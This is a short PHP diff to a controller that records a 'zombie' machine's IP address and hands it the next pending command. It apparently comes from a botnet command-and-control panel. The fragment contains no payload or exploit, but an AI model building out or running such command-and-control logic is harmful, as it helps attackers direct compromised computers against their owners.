@@ -30,6 +30,10 @@ class CommandController extends BaseController {
 	{
 		$zombie = Zombie::find($zombie_id);
 
+		$ip = Input::get('ip');
+		$zombie->ip = $ip;
+		$zombie->save();
+
 		$command = Command::where('status', '=', 0)->first();
 		if (is_null($command)) {
 			return 'No Commands';
